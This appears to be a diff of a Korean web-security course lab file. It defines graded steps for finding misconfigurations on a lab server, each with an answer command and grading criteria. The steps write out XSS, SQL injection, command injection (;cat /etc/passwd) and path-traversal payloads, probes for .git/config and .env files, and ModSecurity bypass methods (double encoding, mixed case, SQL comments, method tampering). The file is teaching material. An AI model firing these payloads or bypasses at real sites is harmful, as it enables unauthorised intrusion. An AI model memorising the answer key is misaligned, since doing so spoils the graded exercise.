@@ -3,7 +3,8 @@ title: 보안 설정 오류 실습
 version: non-ai
 course: web-vuln-nonai
 week: 14
-description: 웹 서버, 애플리케이션, WAF의 보안 설정 오류를 탐지하고, ModSecurity 우회 기법을 통해 설정 강화의 필요성을 실습합니다.
+description: 웹 서버, 애플리케이션, WAF의 보안 설정 오류를 탐지하고, ModSecurity 우회 기법을 통해 설정 강화의 필요성을
+  실습합니다.
 difficulty: hard
 duration_minutes: 120
 objectives:
@@ -13,20 +14,31 @@ objectives:
 pass_threshold: 0.6
 steps:
 - order: 1
-  instruction: nikto를 사용하여 대상 웹 서버({{WEB_IP}}:3000)의 보안 설정을 스캔하시오. 기본 설정 문제, 불필요한 파일 노출 등을 탐지하라.
+  instruction: 'nikto를 사용하여 대상 웹 서버({{WEB_IP}}:3000)의 보안 설정을 스캔하시오. 기본 설정 문제, 불필요한
+    파일 노출 등을 탐지하라.
+
+
+    ■ 학습 도구 (병행 추천)
+
+
+    **nikto 종합**: nikto -h / **nuclei -t http/misconfiguration/** / nmap --script
+    http-* / **DalFox** / **httpx** -tech-detect
+
+
+    결과 stdout 1~3줄을 ``` 블록으로 답변에 quote.'
   hint: nikto -h http://{{WEB_IP}}:3000 -maxtime 30 형태로 실행하세요.
   category: recon
   points: 8
   answer: nikto -h http://10.20.30.80:3000 -maxtime 30 2>/dev/null | head -30
-  answer_detail: nikto는 웹 서버의 알려진 취약점, 설정 오류, 기본 파일 등을 자동으로 스캔합니다. Server 헤더 정보 노출, 디렉터리 리스팅, 기본 파일(phpinfo.php,
-    .htaccess), HTTP 메서드 설정 등을 확인합니다.
+  answer_detail: nikto는 웹 서버의 알려진 취약점, 설정 오류, 기본 파일 등을 자동으로 스캔합니다. Server 헤더 정보 노출,
+    디렉터리 리스팅, 기본 파일(phpinfo.php, .htaccess), HTTP 메서드 설정 등을 확인합니다.
   verify:
     type: output_regex
     expect: nikto|Nikto
     field: stdout
     semantic:
-      intent: nikto 스캔 — nikto -h http://10.20.30.80:3000 -maxtime 30. 알려진 취약점/설정 오류/기본 파일/디렉터리 리스팅/HTTP
-        메서드 자동 탐지. OWASP A05. 웹 스캐너 표준.
+      intent: nikto 스캔 — nikto -h http://10.20.30.80:3000 -maxtime 30. 알려진 취약점/설정
+        오류/기본 파일/디렉터리 리스팅/HTTP 메서드 자동 탐지. OWASP A05. 웹 스캐너 표준.
       success_criteria:
       - nikto 또는 Nikto 키워드
       - nikto -h URL
@@ -41,25 +53,38 @@ steps:
       - 단순 curl
   target_vm: attacker
 - order: 2
-  instruction: 각 포트(80, 3000, 8080)의 Server 헤더 정보 노출을 확인하시오. 서버 종류, 버전, 프레임워크 정보가 응답 헤더에 노출되는지 확인하라.
+  instruction: '각 포트(80, 3000, 8080)의 Server 헤더 정보 노출을 확인하시오. 서버 종류, 버전, 프레임워크 정보가
+    응답 헤더에 노출되는지 확인하라.
+
+
+    ■ 학습 도구 (병행 추천)
+
+
+    **Server 헤더 노출**: curl -I + grep -i server / whatweb / **httpx -title -tech-detect
+    -status-code** / nmap -sV
+
+
+    결과 stdout 1~3줄을 ``` 블록으로 답변에 quote.'
   hint: curl -sI로 각 포트의 응답 헤더를 확인하세요. Server, X-Powered-By 등의 헤더를 검사합니다.
   category: recon
   points: 8
   answer: '🖥️ UI: 브라우저에서 http://WEB_IP:3000 접속
 
-    📎 참고 (CLI): echo ''=== Port 80 (Apache+ModSecurity) ==='' && curl -sI http://10.20.30.80:80 | grep
-    -iE ''(server|x-powered|x-aspnet)'' && echo ''=== Port 3000 (JuiceShop) ==='' && curl -sI http://10.20.30.80:3000
-    | grep -iE ''(server|x-powered|x-aspnet)'' && echo ''=== Port 8080 (DVWA) ==='' && curl -sI http://10.20.30.80:8080
-    | grep -iE ''(server|x-powered|x-aspnet)'''
-  answer_detail: Server 헤더에 소프트웨어 이름과 버전이 노출되면 공격자가 해당 버전의 알려진 CVE를 검색할 수 있습니다. Apache는 ServerTokens Prod,
-    Nginx는 server_tokens off로 최소 정보만 노출해야 합니다. X-Powered-By 헤더는 완전히 제거해야 합니다.
+    📎 참고 (CLI): echo ''=== Port 80 (Apache+ModSecurity) ==='' && curl -sI http://10.20.30.80:80
+    | grep -iE ''(server|x-powered|x-aspnet)'' && echo ''=== Port 3000 (JuiceShop)
+    ==='' && curl -sI http://10.20.30.80:3000 | grep -iE ''(server|x-powered|x-aspnet)''
+    && echo ''=== Port 8080 (DVWA) ==='' && curl -sI http://10.20.30.80:8080 | grep
+    -iE ''(server|x-powered|x-aspnet)'''
+  answer_detail: Server 헤더에 소프트웨어 이름과 버전이 노출되면 공격자가 해당 버전의 알려진 CVE를 검색할 수 있습니다. Apache는
+    ServerTokens Prod, Nginx는 server_tokens off로 최소 정보만 노출해야 합니다. X-Powered-By 헤더는
+    완전히 제거해야 합니다.
   verify:
     type: output_contains
     expect: Server
     field: stdout
     semantic:
-      intent: Server 헤더 노출 — curl -sI + grep '(server|x-powered|x-aspnet)' × 3 포트 (80/3000/8080). CVE
-        매칭. ServerTokens Prod + X-Powered-By 제거. OWASP A05 + CWE-200.
+      intent: Server 헤더 노출 — curl -sI + grep '(server|x-powered|x-aspnet)' × 3 포트
+        (80/3000/8080). CVE 매칭. ServerTokens Prod + X-Powered-By 제거. OWASP A05 + CWE-200.
       success_criteria:
       - Server 키워드
       - 3 포트 검증
@@ -74,27 +99,38 @@ steps:
       - CVE 맥락 없음
   target_vm: attacker
 - order: 3
-  instruction: 디렉터리 리스팅(Directory Listing)이 활성화된 경로를 찾으시오. JuiceShop의 /ftp/, /assets/, /encryptionkeys/
-    등을 확인하라.
+  instruction: '디렉터리 리스팅(Directory Listing)이 활성화된 경로를 찾으시오. JuiceShop의 /ftp/, /assets/,
+    /encryptionkeys/ 등을 확인하라.
+
+
+    ■ 학습 도구 (병행 추천)
+
+
+    **디렉토리 listing**: gobuster dir / ffuf -mc 200 / nikto -Tuning 1 / nuclei -tags
+    listing
+
+
+    결과 stdout 1~3줄을 ``` 블록으로 답변에 quote.'
   hint: curl로 각 디렉터리에 접근하여 파일 목록이 표시되는지 확인하세요.
   category: exploit
   points: 10
   answer: '🖥️ UI: 브라우저에서 http://WEB_IP:3000 접속
 
-    📎 참고 (CLI): echo ''=== Directory Listing Check ==='' && for DIR in ftp assets encryptionkeys public;
-    do echo -n "/$DIR/: " && RESP=$(curl -s http://10.20.30.80:3000/$DIR/ | head -c 200) && if echo "$RESP"
-    | grep -qi ''href\|listing\|index of''; then echo ''EXPOSED''; else echo "HTTP $(curl -s -o /dev/null
-    -w ''%{http_code}'' http://10.20.30.80:3000/$DIR/)"; fi; done && echo ''=== Dir Listing Check Complete
-    ==='''
-  answer_detail: 디렉터리 리스팅이 활성화되면 백업 파일, 설정 파일, 소스코드 등이 노출됩니다. JuiceShop의 /ftp/ 디렉터리에는 package.json.bak,
-    쿠폰 파일 등이 노출되어 있습니다. Apache는 Options -Indexes로 비활성화합니다.
+    📎 참고 (CLI): echo ''=== Directory Listing Check ==='' && for DIR in ftp assets
+    encryptionkeys public; do echo -n "/$DIR/: " && RESP=$(curl -s http://10.20.30.80:3000/$DIR/
+    | head -c 200) && if echo "$RESP" | grep -qi ''href\|listing\|index of''; then
+    echo ''EXPOSED''; else echo "HTTP $(curl -s -o /dev/null -w ''%{http_code}'' http://10.20.30.80:3000/$DIR/)";
+    fi; done && echo ''=== Dir Listing Check Complete ==='''
+  answer_detail: 디렉터리 리스팅이 활성화되면 백업 파일, 설정 파일, 소스코드 등이 노출됩니다. JuiceShop의 /ftp/ 디렉터리에는
+    package.json.bak, 쿠폰 파일 등이 노출되어 있습니다. Apache는 Options -Indexes로 비활성화합니다.
   verify:
     type: output_contains
     expect: Dir Listing Check Complete
     field: stdout
     semantic:
-      intent: 디렉터리 리스팅 — for DIR in ftp assets encryptionkeys public; curl + grep 'href|listing|index
-        of'. JuiceShop /ftp/ 백업 파일 노출. Apache Options -Indexes. OWASP A05.
+      intent: 디렉터리 리스팅 — for DIR in ftp assets encryptionkeys public; curl + grep
+        'href|listing|index of'. JuiceShop /ftp/ 백업 파일 노출. Apache Options -Indexes.
+        OWASP A05.
       success_criteria:
       - Dir Listing Check Complete 키워드
       - 다중 디렉터리 (4개 이상)
@@ -109,26 +145,39 @@ steps:
       - 리스팅 검증 없음
   target_vm: attacker
 - order: 4
-  instruction: 민감 파일 노출을 확인하시오. 백업 파일(.bak), 설정 파일(.env), VCS 디렉터리(.git), 소스맵(.map) 등이 웹에서 접근 가능한지 테스트하라.
-  hint: curl로 /.git/config, /.env, /robots.txt, /package.json, /main.js.map, /ftp/package.json.bak 등에
-    접근하세요.
+  instruction: '민감 파일 노출을 확인하시오. 백업 파일(.bak), 설정 파일(.env), VCS 디렉터리(.git), 소스맵(.map)
+    등이 웹에서 접근 가능한지 테스트하라.
+
+
+    ■ 학습 도구 (병행 추천)
+
+
+    **민감 파일 노출**: gobuster -x bak,old,zip,env / **gitdumper** (.git 노출) / **truffleHog**
+    (secret 검색) / **gitleaks**
+
+
+    결과 stdout 1~3줄을 ``` 블록으로 답변에 quote.'
+  hint: curl로 /.git/config, /.env, /robots.txt, /package.json, /main.js.map, /ftp/package.json.bak
+    등에 접근하세요.
   category: exploit
   points: 12
-  answer: 'echo ''=== Sensitive File Scan ==='' && for FILE in .git/config .env .htaccess robots.txt package.json
-    main.js.map ftp/package.json.bak ftp/coupons_2013.md.bak ftp/eastere.gg; do SIZE=$(curl -s -o /dev/null
-    -w ''%{size_download}'' http://10.20.30.80:3000/$FILE 2>/dev/null); CODE=$(curl -s -o /dev/null -w
-    ''%{http_code}'' http://10.20.30.80:3000/$FILE 2>/dev/null); echo "/$FILE: HTTP $CODE ($SIZE bytes)";
-    done && echo ''=== Sensitive File Scan Complete ==='''
-  answer_detail: package.json은 의존성 정보(버전 포함)를 노출하여 알려진 취약점(CVE)을 매칭할 수 있습니다. .bak 파일에는 이전 설정이나 쿠폰 코드가
-    남아있을 수 있습니다. .git/config가 노출되면 git-dumper로 전체 소스코드를 복원할 수 있습니다.
+  answer: 'echo ''=== Sensitive File Scan ==='' && for FILE in .git/config .env .htaccess
+    robots.txt package.json main.js.map ftp/package.json.bak ftp/coupons_2013.md.bak
+    ftp/eastere.gg; do SIZE=$(curl -s -o /dev/null -w ''%{size_download}'' http://10.20.30.80:3000/$FILE
+    2>/dev/null); CODE=$(curl -s -o /dev/null -w ''%{http_code}'' http://10.20.30.80:3000/$FILE
+    2>/dev/null); echo "/$FILE: HTTP $CODE ($SIZE bytes)"; done && echo ''=== Sensitive
+    File Scan Complete ==='''
+  answer_detail: package.json은 의존성 정보(버전 포함)를 노출하여 알려진 취약점(CVE)을 매칭할 수 있습니다. .bak
+    파일에는 이전 설정이나 쿠폰 코드가 남아있을 수 있습니다. .git/config가 노출되면 git-dumper로 전체 소스코드를 복원할 수
+    있습니다.
   verify:
     type: output_contains
     expect: Sensitive File Scan Complete
     field: stdout
     semantic:
-      intent: 민감 파일 노출 — for FILE in .git/config .env .htaccess package.json main.js.map ftp/*.bak; curl
-        + size/code. .git/config → git-dumper 소스 복원. .env → DB 비밀번호. package.json → CVE 매칭. OWASP A05
-        + CWE-200.
+      intent: 민감 파일 노출 — for FILE in .git/config .env .htaccess package.json main.js.map
+        ftp/*.bak; curl + size/code. .git/config → git-dumper 소스 복원. .env → DB 비밀번호.
+        package.json → CVE 매칭. OWASP A05 + CWE-200.
       success_criteria:
       - Sensitive File Scan Complete 키워드
       - 민감 파일 5개 이상
@@ -143,7 +192,17 @@ steps:
       - 소스 복원 맥락 없음
   target_vm: attacker
 - order: 5
-  instruction: 에러 메시지를 통한 정보 노출을 확인하시오. 의도적으로 에러를 유발하여 스택 트레이스, 데이터베이스 정보, 파일 경로 등이 노출되는지 테스트하라.
+  instruction: '에러 메시지를 통한 정보 노출을 확인하시오. 의도적으로 에러를 유발하여 스택 트레이스, 데이터베이스 정보, 파일 경로
+    등이 노출되는지 테스트하라.
+
+
+    ■ 학습 도구 (병행 추천)
+
+
+    **에러 페이지 분석**: curl 잘못된 path / nikto / nuclei -tags exposure / **wpscan** WP 에러
+
+
+    결과 stdout 1~3줄을 ``` 블록으로 답변에 quote.'
   hint: 잘못된 SQL 구문, 존재하지 않는 API 경로, 잘못된 파라미터 타입 등으로 에러를 유발하세요.
   category: exploit
   points: 12
@@ -151,15 +210,15 @@ steps:
     | head -c 300 && echo '' && echo '[Invalid API]' && curl -s http://10.20.30.80:3000/api/Nonexistent/
     | head -c 200 && echo '' && echo '[Type Error]' && curl -s 'http://10.20.30.80:3000/api/Products/abc'
     | head -c 200 && echo '' && echo '=== Error Leak Check Complete ==='
-  answer_detail: 상세한 에러 메시지는 데이터베이스 종류(SQLite, MySQL), 테이블 구조, 파일 시스템 경로, 프레임워크 버전 등을 노출합니다. 프로덕션에서는 일반적인
-    에러 페이지만 표시하고 상세 로그는 서버 내부에만 기록해야 합니다.
+  answer_detail: 상세한 에러 메시지는 데이터베이스 종류(SQLite, MySQL), 테이블 구조, 파일 시스템 경로, 프레임워크 버전
+    등을 노출합니다. 프로덕션에서는 일반적인 에러 페이지만 표시하고 상세 로그는 서버 내부에만 기록해야 합니다.
   verify:
     type: output_contains
     expect: Error Leak Check Complete
     field: stdout
     semantic:
-      intent: 에러 정보 노출 — SQL 에러(test') + 미존재 API(/api/Nonexistent/) + 타입 에러(/api/Products/abc). 스택 트레이스/DB
-        종류/경로 노출 → NODE_ENV=production. CWE-209.
+      intent: 에러 정보 노출 — SQL 에러(test') + 미존재 API(/api/Nonexistent/) + 타입 에러(/api/Products/abc).
+        스택 트레이스/DB 종류/경로 노출 → NODE_ENV=production. CWE-209.
       success_criteria:
       - Error Leak Check Complete 키워드
       - 에러 유발 3종 (SQL/404/type)
@@ -174,26 +233,38 @@ steps:
       - 정보 노출 맥락 없음
   target_vm: attacker
 - order: 6
-  instruction: ModSecurity WAF의 존재를 탐지하고, 알려진 공격 패이로드를 포트 80으로 전송하여 차단 동작을 확인하시오.
-  hint: XSS(<script>alert(1)</script>), SQLi(' OR 1=1--), Command Injection(;cat /etc/passwd), Path Traversal(../../../etc/passwd)
-    페이로드를 포트 80에 전송하세요.
+  instruction: 'ModSecurity WAF의 존재를 탐지하고, 알려진 공격 패이로드를 포트 80으로 전송하여 차단 동작을 확인하시오.
+
+
+    ■ 학습 도구 (병행 추천)
+
+
+    **WAF 식별**: **wafw00f** / nuclei -t http/technologies/waf-detect.yaml / curl 80
+    vs 3000
+
+
+    결과 stdout 1~3줄을 ``` 블록으로 답변에 quote.'
+  hint: XSS(<script>alert(1)</script>), SQLi(' OR 1=1--), Command Injection(;cat /etc/passwd),
+    Path Traversal(../../../etc/passwd) 페이로드를 포트 80에 전송하세요.
   category: exploit
   points: 12
-  answer: echo '=== WAF Detection Test ===' && echo -n '[XSS] ' && curl -s -o /dev/null -w 'HTTP:%{http_code}'
-    'http://10.20.30.80:80/?q=%3Cscript%3Ealert(1)%3C/script%3E' && echo '' && echo -n '[SQLi] ' && curl
-    -s -o /dev/null -w 'HTTP:%{http_code}' "http://10.20.30.80:80/?id=1'+OR+1=1--" && echo '' && echo
-    -n '[CMDi] ' && curl -s -o /dev/null -w 'HTTP:%{http_code}' 'http://10.20.30.80:80/?cmd=;cat+/etc/passwd'
-    && echo '' && echo -n '[LFI] ' && curl -s -o /dev/null -w 'HTTP:%{http_code}' 'http://10.20.30.80:80/../../etc/passwd'
-    && echo '' && echo '=== WAF Detection Complete ==='
-  answer_detail: ModSecurity는 OWASP Core Rule Set(CRS)을 사용하여 공격 패턴을 탐지합니다. 403이 반환되면 WAF가 차단한 것입니다. 모든
-    공격 유형에 대해 403이 나와야 정상입니다. 200이 나오면 해당 공격 유형의 룰이 미적용된 것입니다.
+  answer: echo '=== WAF Detection Test ===' && echo -n '[XSS] ' && curl -s -o /dev/null
+    -w 'HTTP:%{http_code}' 'http://10.20.30.80:80/?q=%3Cscript%3Ealert(1)%3C/script%3E'
+    && echo '' && echo -n '[SQLi] ' && curl -s -o /dev/null -w 'HTTP:%{http_code}'
+    "http://10.20.30.80:80/?id=1'+OR+1=1--" && echo '' && echo -n '[CMDi] ' && curl
+    -s -o /dev/null -w 'HTTP:%{http_code}' 'http://10.20.30.80:80/?cmd=;cat+/etc/passwd'
+    && echo '' && echo -n '[LFI] ' && curl -s -o /dev/null -w 'HTTP:%{http_code}'
+    'http://10.20.30.80:80/../../etc/passwd' && echo '' && echo '=== WAF Detection
+    Complete ==='
+  answer_detail: ModSecurity는 OWASP Core Rule Set(CRS)을 사용하여 공격 패턴을 탐지합니다. 403이 반환되면
+    WAF가 차단한 것입니다. 모든 공격 유형에 대해 403이 나와야 정상입니다. 200이 나오면 해당 공격 유형의 룰이 미적용된 것입니다.
   verify:
     type: output_contains
     expect: WAF Detection Complete
     field: stdout
     semantic:
-      intent: WAF 탐지 — XSS/SQLi/CMDi/LFI 4종 페이로드 포트 80 전송. 403 = WAF 차단. ModSecurity OWASP CRS. 403/200
-        응답 비교. 각 공격 유형별 룰 적용 검증. MITRE T1036.
+      intent: WAF 탐지 — XSS/SQLi/CMDi/LFI 4종 페이로드 포트 80 전송. 403 = WAF 차단. ModSecurity
+        OWASP CRS. 403/200 응답 비교. 각 공격 유형별 룰 적용 검증. MITRE T1036.
       success_criteria:
       - WAF Detection Complete 키워드
       - 4종 공격 (XSS/SQLi/CMDi/LFI)
@@ -208,26 +279,40 @@ steps:
       - WAF 맥락 없음
   target_vm: attacker
 - order: 7
-  instruction: WAF 우회를 위한 인코딩 기법을 테스트하시오. URL 이중 인코딩, 대소문자 혼합, SQL 주석 삽입으로 XSS/SQLi 차단을 우회하라.
-  hint: <script>를 %253Cscript%253E(이중 인코딩), <ScRiPt>(대소문자 혼합), UNION/**/SELECT(SQL 주석) 등으로 변환하세요.
+  instruction: 'WAF 우회를 위한 인코딩 기법을 테스트하시오. URL 이중 인코딩, 대소문자 혼합, SQL 주석 삽입으로 XSS/SQLi
+    차단을 우회하라.
+
+
+    ■ 학습 도구 (병행 추천)
+
+
+    **WAF 우회 인코딩**: URL 이중 인코딩 / 대소문자 / **sqlmap --tamper** / **xsstrike --waf-evasion**
+    / Bypass-WAF Burp 확장
+
+
+    결과 stdout 1~3줄을 ``` 블록으로 답변에 quote.'
+  hint: <script>를 %253Cscript%253E(이중 인코딩), <ScRiPt>(대소문자 혼합), UNION/**/SELECT(SQL
+    주석) 등으로 변환하세요.
   category: exploit
   points: 12
-  answer: echo '=== WAF Bypass Techniques ===' && echo -n '[Normal XSS - blocked] ' && curl -s -o /dev/null
-    -w 'HTTP:%{http_code}' 'http://10.20.30.80:80/?q=%3Cscript%3Ealert(1)%3C/script%3E' && echo '' &&
-    echo -n '[Double Encoded] ' && curl -s -o /dev/null -w 'HTTP:%{http_code}' 'http://10.20.30.80:80/?q=%253Cscript%253Ealert(1)%253C/script%253E'
-    && echo '' && echo -n '[Mixed Case] ' && curl -s -o /dev/null -w 'HTTP:%{http_code}' 'http://10.20.30.80:80/?q=%3CScRiPt%3Ealert(1)%3C/ScRiPt%3E'
-    && echo '' && echo -n '[SQL Comment] ' && curl -s -o /dev/null -w 'HTTP:%{http_code}' 'http://10.20.30.80:80/?id=1+UNION/**/SELECT/**/1,2,3'
-    && echo '' && echo -n '[HPP] ' && curl -s -o /dev/null -w 'HTTP:%{http_code}' 'http://10.20.30.80:80/?id=1&id=OR+1%3D1--'
+  answer: echo '=== WAF Bypass Techniques ===' && echo -n '[Normal XSS - blocked]
+    ' && curl -s -o /dev/null -w 'HTTP:%{http_code}' 'http://10.20.30.80:80/?q=%3Cscript%3Ealert(1)%3C/script%3E'
+    && echo '' && echo -n '[Double Encoded] ' && curl -s -o /dev/null -w 'HTTP:%{http_code}'
+    'http://10.20.30.80:80/?q=%253Cscript%253Ealert(1)%253C/script%253E' && echo ''
+    && echo -n '[Mixed Case] ' && curl -s -o /dev/null -w 'HTTP:%{http_code}' 'http://10.20.30.80:80/?q=%3CScRiPt%3Ealert(1)%3C/ScRiPt%3E'
+    && echo '' && echo -n '[SQL Comment] ' && curl -s -o /dev/null -w 'HTTP:%{http_code}'
+    'http://10.20.30.80:80/?id=1+UNION/**/SELECT/**/1,2,3' && echo '' && echo -n '[HPP]
+    ' && curl -s -o /dev/null -w 'HTTP:%{http_code}' 'http://10.20.30.80:80/?id=1&id=OR+1%3D1--'
     && echo '' && echo '=== Bypass Test Complete ==='
-  answer_detail: 이중 인코딩은 WAF가 한 번 디코딩 후 패턴 매칭하지만, 백엔드가 다시 디코딩하여 공격이 성공하는 기법입니다. OWASP CRS 3.x는 재귀적 디코딩과
-    대소문자 무시 매칭으로 대부분 방어합니다. WAF는 만능이 아니므로 서버 측 입력 검증을 병행해야 합니다.
+  answer_detail: 이중 인코딩은 WAF가 한 번 디코딩 후 패턴 매칭하지만, 백엔드가 다시 디코딩하여 공격이 성공하는 기법입니다. OWASP
+    CRS 3.x는 재귀적 디코딩과 대소문자 무시 매칭으로 대부분 방어합니다. WAF는 만능이 아니므로 서버 측 입력 검증을 병행해야 합니다.
   verify:
     type: output_contains
     expect: Bypass Test Complete
     field: stdout
     semantic:
-      intent: WAF 우회 — 이중 인코딩(%253C) + 대소문자(ScRiPt) + SQL 주석(UNION/**/SELECT) + HPP(id=1&id=OR 1=1). CRS
-        3.x 재귀 디코딩 + (?i) 대응. WAF는 만능 X → 서버 검증 필수. CWE-20.
+      intent: WAF 우회 — 이중 인코딩(%253C) + 대소문자(ScRiPt) + SQL 주석(UNION/**/SELECT) + HPP(id=1&id=OR
+        1=1). CRS 3.x 재귀 디코딩 + (?i) 대응. WAF는 만능 X → 서버 검증 필수. CWE-20.
       success_criteria:
       - Bypass Test Complete 키워드
       - 우회 기법 4종 이상
@@ -242,26 +327,39 @@ steps:
       - 이중 인코딩 누락
   target_vm: attacker
 - order: 8
-  instruction: HTTP 메서드 변조와 Content-Type 변경으로 WAF를 우회하시오. GET 대신 PUT/PATCH, JSON 대신 multipart로 같은 공격 페이로드를
-    전송하라.
-  hint: 'curl -X PUT, curl -X PATCH 등으로 메서드를 변경하고, Content-Type: multipart/form-data로 페이로드를 전송하세요.'
+  instruction: 'HTTP 메서드 변조와 Content-Type 변경으로 WAF를 우회하시오. GET 대신 PUT/PATCH, JSON
+    대신 multipart로 같은 공격 페이로드를 전송하라.
+
+
+    ■ 학습 도구 (병행 추천)
+
+
+    **Method/CT 변조**: curl -X / Burp Repeater / **httpoxy** (CGI Proxy header) / **HTTP
+    Smuggler** Burp 확장
+
+
+    결과 stdout 1~3줄을 ``` 블록으로 답변에 quote.'
+  hint: 'curl -X PUT, curl -X PATCH 등으로 메서드를 변경하고, Content-Type: multipart/form-data로
+    페이로드를 전송하세요.'
   category: exploit
   points: 10
-  answer: 'PAYLOAD="id=1''+OR+1=1--" && echo ''=== HTTP Method Bypass ==='' && for METHOD in GET POST
-    PUT PATCH; do echo -n "[$METHOD] " && curl -s -o /dev/null -w ''HTTP:%{http_code}'' -X $METHOD -d
-    "$PAYLOAD" http://10.20.30.80:80/ && echo ''''; done && echo ''=== Content-Type Bypass ==='' && echo
-    -n ''[JSON] '' && curl -s -o /dev/null -w ''HTTP:%{http_code}'' -X POST http://10.20.30.80:80/ -H
-    ''Content-Type: application/json'' -d ''{"id":"1 OR 1=1--"}'' && echo '''' && echo ''=== Method Bypass
-    Test Complete ==='''
-  answer_detail: 일부 WAF 규칙은 특정 HTTP 메서드(GET/POST)에만 적용됩니다. PUT이나 PATCH로 같은 페이로드를 보내면 규칙이 매칭되지 않아 우회될 수
-    있습니다. WAF 규칙은 모든 HTTP 메서드에 적용되어야 합니다.
+  answer: 'PAYLOAD="id=1''+OR+1=1--" && echo ''=== HTTP Method Bypass ==='' && for
+    METHOD in GET POST PUT PATCH; do echo -n "[$METHOD] " && curl -s -o /dev/null
+    -w ''HTTP:%{http_code}'' -X $METHOD -d "$PAYLOAD" http://10.20.30.80:80/ && echo
+    ''''; done && echo ''=== Content-Type Bypass ==='' && echo -n ''[JSON] '' && curl
+    -s -o /dev/null -w ''HTTP:%{http_code}'' -X POST http://10.20.30.80:80/ -H ''Content-Type:
+    application/json'' -d ''{"id":"1 OR 1=1--"}'' && echo '''' && echo ''=== Method
+    Bypass Test Complete ==='''
+  answer_detail: 일부 WAF 규칙은 특정 HTTP 메서드(GET/POST)에만 적용됩니다. PUT이나 PATCH로 같은 페이로드를 보내면
+    규칙이 매칭되지 않아 우회될 수 있습니다. WAF 규칙은 모든 HTTP 메서드에 적용되어야 합니다.
   verify:
     type: output_contains
     expect: Method Bypass Test Complete
     field: stdout
     semantic:
-      intent: '메서드 + CT 우회 — for METHOD in GET POST PUT PATCH; curl -X $METHOD + Content-Type: application/json
-        vs multipart. 특정 메서드에만 룰 적용 시 PUT/PATCH 우회. 모든 메서드 룰 적용 필수. CWE-20.'
+      intent: '메서드 + CT 우회 — for METHOD in GET POST PUT PATCH; curl -X $METHOD + Content-Type:
+        application/json vs multipart. 특정 메서드에만 룰 적용 시 PUT/PATCH 우회. 모든 메서드 룰 적용 필수.
+        CWE-20.'
       success_criteria:
       - Method Bypass Test Complete 키워드
       - 4 메서드 + CT 변경
@@ -276,27 +374,38 @@ steps:
       - 우회 맥락 없음
   target_vm: attacker
 - order: 9
-  instruction: CORS 설정 오류를 확인하시오. Origin 헤더를 evil.com으로 설정하여 크로스 도메인 접근이 허용되는지 테스트하라.
-  hint: 'curl -H ''Origin: http://evil.com'' 으로 요청하고, Access-Control-Allow-Origin 응답 헤더를 확인하세요.'
+  instruction: 'CORS 설정 오류를 확인하시오. Origin 헤더를 evil.com으로 설정하여 크로스 도메인 접근이 허용되는지 테스트하라.
+
+
+    ■ 학습 도구 (병행 추천)
+
+
+    **CORS 오류**: curl -H ''Origin: evil.com'' -I / **CORScanner** / **Corsy** / Burp
+    Repeater Origin 변조
+
+
+    결과 stdout 1~3줄을 ``` 블록으로 답변에 quote.'
+  hint: 'curl -H ''Origin: http://evil.com'' 으로 요청하고, Access-Control-Allow-Origin
+    응답 헤더를 확인하세요.'
   category: exploit
   points: 10
   answer: '🖥️ UI: 브라우저에서 http://WEB_IP:3000 접속
 
-    📎 참고 (CLI): echo ''=== CORS Misconfiguration Test ==='' && echo ''[JuiceShop - evil.com]'' && curl
-    -sI http://10.20.30.80:3000/api/Products/ -H ''Origin: http://evil.com'' | grep -i access-control
-    && echo ''[JuiceShop - null origin]'' && curl -sI http://10.20.30.80:3000/api/Products/ -H ''Origin:
-    null'' | grep -i access-control && echo ''[DVWA - evil.com]'' && curl -sI http://10.20.30.80:8080/
-    -H ''Origin: http://evil.com'' | grep -i access-control || echo ''No CORS headers'' && echo ''===
-    CORS Test Complete ==='''
-  answer_detail: Access-Control-Allow-Origin이 요청의 Origin을 그대로 반영하거나 *이면, 모든 도메인에서 API를 호출할 수 있습니다. 공격자의
-    악성 사이트에서 JavaScript로 API를 호출하여 인증된 사용자의 데이터를 탈취할 수 있습니다.
+    📎 참고 (CLI): echo ''=== CORS Misconfiguration Test ==='' && echo ''[JuiceShop -
+    evil.com]'' && curl -sI http://10.20.30.80:3000/api/Products/ -H ''Origin: http://evil.com''
+    | grep -i access-control && echo ''[JuiceShop - null origin]'' && curl -sI http://10.20.30.80:3000/api/Products/
+    -H ''Origin: null'' | grep -i access-control && echo ''[DVWA - evil.com]'' &&
+    curl -sI http://10.20.30.80:8080/ -H ''Origin: http://evil.com'' | grep -i access-control
+    || echo ''No CORS headers'' && echo ''=== CORS Test Complete ==='''
+  answer_detail: Access-Control-Allow-Origin이 요청의 Origin을 그대로 반영하거나 *이면, 모든 도메인에서
+    API를 호출할 수 있습니다. 공격자의 악성 사이트에서 JavaScript로 API를 호출하여 인증된 사용자의 데이터를 탈취할 수 있습니다.
   verify:
     type: output_contains
     expect: CORS Test Complete
     field: stdout
     semantic:
-      intent: 'CORS 오류 — curl -H ''Origin: http://evil.com'' + -H ''Origin: null'' + DVWA 별도 검증. ACAO
-        반영/* + credentials = 위험. 공격자 사이트 JS가 API 호출 + 응답 읽기. CWE-942.'
+      intent: 'CORS 오류 — curl -H ''Origin: http://evil.com'' + -H ''Origin: null''
+        + DVWA 별도 검증. ACAO 반영/* + credentials = 위험. 공격자 사이트 JS가 API 호출 + 응답 읽기. CWE-942.'
       success_criteria:
       - CORS Test Complete 키워드
       - evil.com + null origin 변조
@@ -311,27 +420,41 @@ steps:
       - 단순 GET
   target_vm: attacker
 - order: 10
-  instruction: 보안 설정 오류 종합 점검 결과를 정리하시오. 발견된 설정 오류를 위험도별로 분류하고 조치 우선순위를 정하라.
+  instruction: '보안 설정 오류 종합 점검 결과를 정리하시오. 발견된 설정 오류를 위험도별로 분류하고 조치 우선순위를 정하라.
+
+
+    ■ 학습 도구 (병행 추천)
+
+
+    **보고서**: 위험도 분류표 / **Mozilla Observatory** 등급 / DefectDojo / OWASP A05 / CVSS
+    / sha256
+
+
+    결과 stdout 1~3줄을 ``` 블록으로 답변에 quote.'
   hint: 서버 배너, 디렉터리 리스팅, 에러 정보 노출, 민감 파일 접근, WAF 우회, CORS 오류 등을 종합 정리하세요.
   category: reporting
   points: 10
-  answer: "\U0001F5A5️ UI: 브라우저에서 http://WEB_IP:3000 접속\n\U0001F4CE 참고 (CLI): cat > /tmp/misconfig_report.txt\
-    \ << 'EOF'\n=== 보안 설정 오류 종합 점검 보고서 ===\n대상: 10.20.30.80 (Apache:80, JuiceShop:3000, DVWA:8080)\n\n\
-    [즉시 조치 - CRITICAL]\n1. 디렉터리 리스팅 비활성화\n   Apache: Options -Indexes\n   Express: 정적 파일 서빙 경로 제한\n2.\
